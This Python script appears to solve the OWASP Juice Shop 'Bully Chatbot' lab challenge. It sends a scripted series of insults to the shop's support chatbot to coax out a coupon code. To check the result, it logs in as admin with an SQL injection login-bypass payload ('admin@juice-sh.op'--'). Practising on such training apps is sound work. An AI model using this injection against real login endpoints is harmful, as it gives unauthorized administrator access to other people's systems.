#!/usr/bin/env python3
"""
Bully Chatbot Challenge Solver - Direct Route Approach
Navigate directly to /chatbot route and interact to get coupon
"""

from playwright.sync_api import sync_playwright
import time
import re
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot():
    """Solve Bully Chatbot challenge by going directly to chatbot route"""
    
    print("🤖 BULLY CHATBOT CHALLENGE - Direct Route")
    print("=" * 60)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser for debugging
        page = browser.new_page()
        
        # Navigate directly to chatbot route
        print("📍 Navigating to chatbot page...")
        chatbot_url = f"{TARGET}/#/chatbot"
        page.goto(chatbot_url, wait_until="networkidle", timeout=30000)
        time.sleep(3)  # Let page fully load
        
        print("💬 Looking for chat input field...")
        
        # Try different selectors for the input field
        input_selectors = [
            'input[type="text"]',
            'input[placeholder*="message"]',
            'input[placeholder*="Message"]',
            'textarea',
            'input.mat-input-element',
            'input[aria-label*="message"]'
        ]
        
        chat_input = None
        for selector in input_selectors:
            try:
                element = page.locator(selector).first
                if element.is_visible():
                    chat_input = element
                    print(f"   ✅ Found input field with selector: {selector}")
                    break
            except:
                continue
        
        if not chat_input:
            print("   ❌ No input field found, trying to find all inputs...")
            all_inputs = page.locator('input').all()
            print(f"   Found {len(all_inputs)} input elements")
            
            # Get the last visible text input (usually the chat input)
            for inp in reversed(all_inputs):
                if inp.is_visible():
                    input_type = inp.get_attribute('type') or 'text'
                    if input_type in ['text', 'search', '']:
                        chat_input = inp
                        print("   ✅ Using last visible text input")
                        break
        
        if chat_input:
            print("\n🎯 Sending messages to trigger coupon...")
            
            # Messages that might trigger the coupon
            messages = [
                "hello",
                "help",
                "coupon",
                "give me a coupon",
                "stupid bot",
                "you are stupid",
                "dumb bot",
                "useless bot",
                "worst bot ever",
                "I hate you",
                "you suck",
                "terrible service",
                "awful bot",
                "discount",
                "promo code"
            ]
            
            coupon_pattern = re.compile(r'\b[A-Z0-9]{5,15}\b')
            found_coupon = None
            
            for i, msg in enumerate(messages, 1):
                try:
                    print(f"   {i}. Sending: '{msg}'")
                    
                    # Clear and type message
                    chat_input.clear()
                    chat_input.type(msg, delay=50)
                    
                    # Press Enter
                    chat_input.press("Enter")
                    
                    # Wait for response
                    time.sleep(2)
                    
                    # Check for coupon in page content
                    page_text = page.content()
                    
                    # Look for coupon patterns
                    potential_coupons = coupon_pattern.findall(page_text)
                    
                    # Filter out common non-coupon strings
                    excluded = ['OWASP', 'JUICE', 'SHOP', 'CHATBOT', 'SUPPORT', 'MESSAGE', 'BUTTON']
                    for coupon in potential_coupons:
                        if coupon not in excluded and len(coupon) >= 8:
                            print(f"      🎯 Found potential coupon: {coupon}")
                            found_coupon = coupon
                    
                    # Also check for specific response patterns
                    if 'coupon' in page_text.lower() and 'code' in page_text.lower():
                        print("      📍 Bot mentioned coupon code!")
                        
                except Exception as e:
                    print(f"      ⚠️ Error sending message: {e}")
            
            # Take screenshot for verification
            page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bully_direct.png")
            print("\n📸 Screenshot saved: bully_direct.png")
            
        else:
            print("   ❌ Could not find chat input field")
        
        browser.close()
    
    # Check if challenge was solved
    print("\n📊 Checking challenge status...")
    session = requests.Session()
    
    # Login as admin
    login_resp = session.post(f"{TARGET}/rest/user/login",
                              json={"email": "admin@juice-sh.op'--", "password": "x"})
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        
        # Check challenges
        challenges_resp = session.get(f"{TARGET}/api/Challenges/")
        if challenges_resp.status_code == 200:
            challenges = challenges_resp.json().get('data', [])
            
            # Find Bully Chatbot challenge
            bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
            
            if bully:
                if bully.get('solved', False):
                    print(f"\n✅ SUCCESS! {bully['name']} SOLVED!")
                    print(f"   Difficulty: {bully.get('difficulty', 'Unknown')}")
                    return True
                else:
                    print(f"\n⚠️ {bully['name']} not solved yet")
                    print("   The bot might need more specific insults or different timing")
    
    print("\n💡 Tips:")
    print("   1. Try being more insulting to the bot")
    print("   2. The coupon might appear after multiple mean messages")
    print("   3. Check the screenshot for any visible coupons")
    
    return False

if __name__ == "__main__":
    solve_bully_chatbot()